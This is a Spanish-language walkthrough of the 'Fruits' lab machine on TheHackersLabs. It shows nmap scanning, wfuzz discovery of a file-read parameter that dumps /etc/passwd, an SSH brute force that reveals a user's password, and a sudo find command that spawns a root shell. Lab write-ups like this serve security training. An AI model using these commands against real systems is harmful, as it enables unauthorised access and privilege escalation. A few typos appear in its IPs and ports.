---
title: "thehackerslabs.com: máquina Fruits"
published: true
date: 2024-05-05 18:10:00
tags: [SSH Brute Force, Nmap, Privileged Escalation, Hydra, Apache Server, Wordlist Attack, Directory Traversal, Linux Security Bypass, Pentesting Lab, Fuzzing, Root Access, Sudo, Find Exploit]
image: /blog/assets/thehackerslabs.com_fruits/portada.png
---


<br>
![](/blog/assets/thehackerslabs.com_fruits/portada.png)
<br>


### Descripción
* * *
<br>
En este informe, veremos un recorrido detallado de los pasos que tomamos para explotar una máquina vulnerable del laboratorio de TheHackersLabs.com. La máquina objetivo es un sistema con el nombre de host `Fruits`. Mediante el uso de herramientas de reconocimiento como `nmap`, `wfuzz` y `hydra`, junto con técnicas de fuerza bruta, logramos comprometer con éxito el sistema objetivo.


### Enlace de Lab:
[thehackerslabs: Fruits](https://thehackerslabs.com/fruits/).


### Dificultad:
Fácil.






### Solución
* * *
<br>


Para iniciar el proceso de `vulnerar` esta máquina, lo primero que haremos es con ayuda de `nmap` ver a qué nos estamos enfrentando.


``` shell
nmap -p- -Pn  -sS --min-rate 5000 --open 192.168.1.122  -oX report.xml -v
```
donde:


`-p-`: Escanea todos los puertos existentes (0-65365)


`-Pn`: Evita que `nmap` realice un descubrimiento de host antes de realizar el escaneo


`-sS`: Realiza un escaneo de puertos TCP mediante un escaneo SYN. Esto implica enviar un paquete SYN y esperar una respuesta; si el puerto está abierto, el host responderá con un paquete SYN-ACK


`--min-rate`: Configura la tasa mínima de paquetes enviados a 5000 paquetes por segundo. Esto acelera el escaneo, ya que `nmap` enviará paquetes a una tasa muy alta


`--open`: Esta opción le indica a `nmap` que sólo muestre los puertos que están abiertos.


`-oX`: Guarda la salida del escaneo en un archivo XML llamado `report.xml`


`-v`: Aumenta la verbosidad de la salida de `nmap`, proporcionando más detalles sobre lo que está haciendo `nmap`.


<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_1.JPG)
<br>


Obtenemos 2 puertos abiertos,  `22 -> ssh` y `80 -> http`  .


Ahora es momento de ver con qué versiones nos estamos enfrentando de cada servicio. Para ello implementamos el código:


```shell
nmap -sCV -p222,80 192.168.1.122 -oN ports_version
```


Donde:


**`-sC`**Esta opción le dice a `nmap` que ejecute scripts predeterminados contra los puertos encontrados.
  
**`-sV`**: Le indica a `nmap` que intente determinar la versión de los servicios que se están ejecutando en los puertos abiertos.


>*sCV es la combinación de ambos comandos*.




![](/blog/assets/thehackerslabs.com_fruits/paso_2.JPG)


Nos fijamos que por el `puerto 22` se encuentra un servicio `ssh` no vulnerable, ya que está en últimas versiones. Pues debemos de ir a la web y ver que nos encontramos.


Para ver con qué tecnologías se encuentra la web corremos el siguiente comando:


```shell
whatweb http://192.168.1.122
```
<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_3.JPG)
<br>


Vemos que hay un `Apache 2.4.57` el cual, hasta el momento, no es vulnerable. Pues no nos queda más opción que entrar a la web y buscar un vector de entrada.
<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_4.JPG)
<br>


Aparentemente, es una web con un buscador sencillo. Pero tiene un error. Cuando presionamos sobre el botón `Buscar` nos manda al archivo php llamado `buscar.php` el cual tiene el parámetro `búsqueda` y este siempre dará error, no importa que busquemos.


<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_5.JPG)
<br>


Es momento de hacer un `web fuzzing` con un diccionario especializado para estos casos y que también busque las extensiones `html` y `php`. Quedando de la siguiente forma:


<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_6.JPG)
<br>


Luego de un tiempo, cuando vemos los resultados del `fuzzeo` nos percatamos que hay un archivo de extensión `php` llamado `fruits.php`. El cual si ingresamos en él, es una página en blanco.




<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_7.JPG)
<br>


Esto nos lleva a pensar que, al igual que `buscar.php` este recibe un parámetro el cual no tenemos.


Para determinar cuál es el parámetro que necesitamos, lo que debemos correr es, con una ruta del sistema, en este caso `/etc/passwd`, hacer fuerza bruta con el valor del parámetro. Quedando el comando `wfuzz` de la siguiente manera:


```shell
wfuzz -c --hc 404 --hl 1 -t 200 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt 'http://193.168.1.122/fruits.php?FUZZ=/etc/passwd'
```




<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_8.JPG)
<br>


Vemos que el comando file sí que nos da un resultado, y de paso nos imprime el valor de `/etc/passwd` el cual nos servirá para ver los usuarios del sistema


```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false
bananaman:x:1001:1001::/home/bananaman:/bin/bash
```
de aquí nos interesa `bananaman` ya que es un usuario del sistema y tiene acceso a la `/bin/bash`.


Con ayuda de `Hydra`, ejecutamos un ataque de `fuerza bruta` mediante el `puerto 22`


<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_9.JPG)
<br>


Determinamos que su clave es `celtic`, así que es momento de acceder mediante `ssh` a la máquina virtual.


<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_10.JPG)
<br>


Una vez ya accedimos a la máquina, es momento de determinar cuáles comandos y/o binarios tenemos acceso para poder explotar y `escalar privilegios`.




Con la ejecución del código `sudo -l` vemos que tenemos acceso como usuario root al comando `find`


<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_11.JPG)
<br>


Si vamos a la web de gtfobins[^1] vemos que es vulnerable y podemos obtener acceso `root` mediante este, con la siguiente secuencia de comandos


```shell
sudo /usr/bin/find -exec /bin/sh -p \; -quit
```
<br>
![](/blog/assets/thehackerslabs.com_fruits/paso_12.JPG)
<br>


Y al final obtenemos `root`, es decir, la máquina está comprometida.




<br>
### _Referencias_


[^1]:[Gtfobins](https://gtfobins.github.io/)





